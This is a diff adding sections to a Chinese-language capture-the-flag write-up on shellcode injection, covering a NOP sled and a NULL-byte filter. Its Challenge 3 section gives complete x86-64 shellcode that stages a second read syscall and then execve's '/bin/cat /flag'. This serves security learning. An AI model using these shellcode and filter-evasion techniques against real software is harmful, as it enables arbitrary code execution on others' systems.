@@ -70,3 +70,61 @@ lea o(r1,r2,m), rd
 `argv` 是一个指向字符串指针的指针，我们需要将其设置为一个指向字符串指针的数组。在这里，我们将 `argv` 设置为一个指向字符串指针的数组，其中第一个指针指向 `cmd`，第二个指针指向 `arg2="/flag"`，第三个指针指向 `NULL` 代表终止符。
 
 ## Challenge 2 Shellcode with NOP Sled
+
+这次程序会将 shellcode 的前 800 个字节删除，我们只需要在 shellcode 前面加上一些 NOP 指令即可。
+
+```assembly
+.fill 800, 1, 0x90
+```
+
+`.fill` 是一条伪指令，用于填充数据，其格式为 `.fill n, size, value`，表示填充 `n` 个 `size` 大小的 `value`。
+
+## Challenge 3 Shellcode with NULL-byte Filter
+
+这一次我们将不能使用 NULL 字节，因为程序会将 shellcode 中的 NULL 字节删除。我们将使用一个有意思的技巧，即在 shellcode 中再发起一个系统调用，这样我们可以通过这个系统调用来继续读取新的 shellcode。也就是我们将执行一个 `read(stdin, %rip, 0x1ff)` 的系统调用，这样我们就可以继续读取新的 shellcode。
+
+获取 `%rip` 的值在没有 NULL 字节的情况下是非常困难的，幸运的是，这一次 Victim 程序会将我们的 shellcode 加载到一个固定的地址，我们可以直接在 shellcode 中硬编码常量。
+
+<details markdown="1">
+<summary>shell.s (剧透警告)</summary>
+```assembly
+.section .text
+.global _start
+_start:
+	xor %rax, %rax
+	xor %rdi, %rdi
+	xor %rsi, %rsi
+	xor %rdx, %rdx
+	mov $0x15e0, %si
+        shl $4, %rsi	
+	add $0xd, %rsi
+	shl $12, %rsi
+	mov $0x1ff, %dx
+	syscall
+	.fill 0x1000,1,0x90
+
+	leaq cmd(%rip), %rdi
+	movq %rdi, argv1(%rip)
+	leaq arg2(%rip), %rsi
+	movq %rsi, argv2(%rip)
+	leaq argv1(%rip), %rsi
+	movq $0x3b, %rax
+	movq $0x0, %rdx
+	syscall
+
+cmd: .string "/bin/cat"
+argv1:  .long 0
+	        .long 0
+argv2:  .long 0
+	        .long 0
+	        .long 0
+	        .long 0
+arg2: .string "/flag"
+```
+<details>
+
+同时通过一系列技巧来避免我们的 shellcode 中出现 NULL 字节。
+
+- 使用 `xor` 指令来清空寄存器。
+- 使用 `shl` 和 `add` 指令组合计算。
+- 使用 16 位与 32 位指令而不是 64 位指令来避免 NULL 字节。 
